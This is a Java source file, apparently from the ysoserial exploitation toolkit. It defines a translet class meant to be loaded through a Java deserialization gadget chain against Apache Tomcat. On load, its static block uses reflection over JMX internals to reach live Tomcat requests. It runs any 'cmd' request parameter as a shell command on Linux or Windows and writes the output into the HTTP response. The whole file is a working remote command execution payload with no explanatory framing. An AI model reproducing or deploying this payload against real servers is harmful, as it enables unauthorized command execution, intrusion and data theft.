package ysoserial.payloads;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Scanner;
import javax.management.MBeanServer;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.util.ServerInfo;
import org.apache.coyote.Request;
import org.apache.tomcat.util.buf.ByteChunk;
import org.apache.tomcat.util.modeler.Registry;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class TomcatServletResponse1 extends AbstractTranslet {
    static {
        try {
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap) field.get(obj);
            obj = ((HashMap) obj2.get("Catalina")).get("name=\"http-nio-8877\",type=GlobalRequestProcessor");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            field.setAccessible(true);
            ArrayList obj3 = (ArrayList) field.get(obj);
            field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            field.setAccessible(true);
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }

            for (int i = 0; i < obj3.size(); ++i) {
                Request obj4 = (Request) field.get(obj3.get(i));
                String cmd = obj4.getParameters().getParameter("cmd");
                if (cmd != null) {
                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = (new Scanner(in)).useDelimiter("\\a");
                    String output;
                    for (output = ""; s.hasNext(); output = output + s.next()) {
                    }
                    byte[] buf = output.getBytes("utf-8");
                    ByteBuffer byteBuffer = ByteBuffer.allocate(buf.length);
                    while (in.available() > 0) {
                        byteBuffer.put((byte) in.read());
                    }
                    System.out.println(ServerInfo.getServerNumber());
                    ByteChunk bc = new ByteChunk();
                    bc.setBytes(buf, 0, buf.length);
                    obj4.getResponse().doWrite(bc);
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
